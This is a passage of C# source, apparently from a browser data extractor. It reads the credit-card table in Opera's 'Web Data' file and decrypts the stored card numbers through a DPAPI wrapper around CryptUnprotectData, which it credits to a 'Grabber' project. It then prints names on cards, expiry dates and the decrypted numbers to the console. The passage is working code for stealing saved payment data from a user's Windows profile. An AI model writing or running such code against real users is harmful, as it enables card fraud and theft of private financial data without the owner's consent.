                    byte[] cardNumberEncrypted = (byte[])data[webDataCreditCardsTableCardNumberEncryptedColumn];
                    string dateModified = data[webDataCreditCardsTableDateModifiedColumn].ToString();
                    string useCount = data[webDataCreditCardsTableUseCountColumn].ToString();
                    string useDate = data[webDataCreditCardsTableUseDateColumn].ToString();

                    // Encrypted
                    string cardNumberEncryptedDecrypted = System.Text.Encoding.Default.GetString(DPAPI.DecryptBytes(cardNumberEncrypted));
                    // - Encrypted

                    if (decryptedData != null)
                    {
                        decryptedData.Add(
                        nameOnCard + System.IO.Path.PathSeparator
                        + expirationMonth + System.IO.Path.PathSeparator
                        + expirationYear + System.IO.Path.PathSeparator
                        + cardNumberEncryptedDecrypted + System.IO.Path.PathSeparator
                        + dateModified + System.IO.Path.PathSeparator
                        + useCount + System.IO.Path.PathSeparator
                        + useDate);
                    }
                }

                if (decryptedData != null && decryptedData.Count > 0 && webDataCreditCardsTable.Equals(data.GetTableName(0)))
                {
                    System.Console.WriteLine(webDataFileName + " - Table \"" + webDataCreditCardsTable + "\": "
                        + webDataCreditCardsTableNameOnCardColumn + System.IO.Path.PathSeparator
                        + webDataCreditCardsTableExpirationMonthColumn + System.IO.Path.PathSeparator
                        + webDataCreditCardsTableExpirationYearColumn + System.IO.Path.PathSeparator
                        + webDataCreditCardsTableCardNumberEncryptedColumn + " (Decrypted)" + System.IO.Path.PathSeparator
                        + webDataCreditCardsTableDateModifiedColumn + System.IO.Path.PathSeparator
                        + webDataCreditCardsTableUseCountColumn + System.IO.Path.PathSeparator
                        + webDataCreditCardsTableUseDateColumn);

                    decryptedData.ForEach(item => System.Console.WriteLine(item));
                }
                else
                {
                    System.Console.WriteLine(webDataFileName + " - Table \"" + webDataCreditCardsTable + "\": No data found");
                }

                data.Close();
                data.Dispose();

                retrieveData.Reset();
                retrieveData.Dispose();

                creditCardsConnection.Close();
                creditCardsConnection.Dispose();
            }
            // - "Web Data" Copied File

            if (operaStable)
            {
                System.Console.WriteLine("// - Extract Opera Stable Data \n");
            }
            else if (operaNext)
            {
                System.Console.WriteLine("// - Extract Opera Next Data \n");
            }
            else if (operaDeveloper)
            {
                System.Console.WriteLine("// - Extract Opera Developer Data \n");
            }
        }
        // - Opera (Stable, Next, Developer)

        // DPAPI (Reference: https://github.com/garrett-davidson/AccXtract/blob/master/Grabber/DPAPI.cs)
        public class DPAPI
        {
            [System.Runtime.InteropServices.DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
            private static extern bool CryptUnprotectData(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy, System.IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pPlainText);

            [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
            internal struct DATA_BLOB
            {
                public int cbData;
                public System.IntPtr pbData;
            }

            [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
            internal struct CRYPTPROTECT_PROMPTSTRUCT
            {
                public int cbSize;
                public int dwPromptFlags;
                public System.IntPtr hwndApp;
                public string szPrompt;
            }

            public static byte[] DecryptBytes(byte[] input)
            {
                DATA_BLOB encryptedBlob = new DATA_BLOB();
                DATA_BLOB decryptedBlob = new DATA_BLOB();

                encryptedBlob.pbData = System.Runtime.InteropServices.Marshal.AllocHGlobal(input.Length);
                encryptedBlob.cbData = input.Length;

                System.Runtime.InteropServices.Marshal.Copy(input, 0, encryptedBlob.pbData, input.Length);

                string a = "";

                DATA_BLOB b = new DATA_BLOB();

                CRYPTPROTECT_PROMPTSTRUCT d = new CRYPTPROTECT_PROMPTSTRUCT();

                CryptUnprotectData(ref encryptedBlob, ref a, ref b, ((System.IntPtr)((int)(0))), ref d, 0, ref decryptedBlob);

                byte[] plainTextBytes = new byte[decryptedBlob.cbData];

                System.Runtime.InteropServices.Marshal.Copy(decryptedBlob.pbData, plainTextBytes, 0, decryptedBlob.cbData);

                return plainTextBytes;
            }
        }
        // - DPAPI (Reference: https://github.com/garrett-davidson/AccXtract/blob/master/Grabber/DPAPI.cs)
    }
}
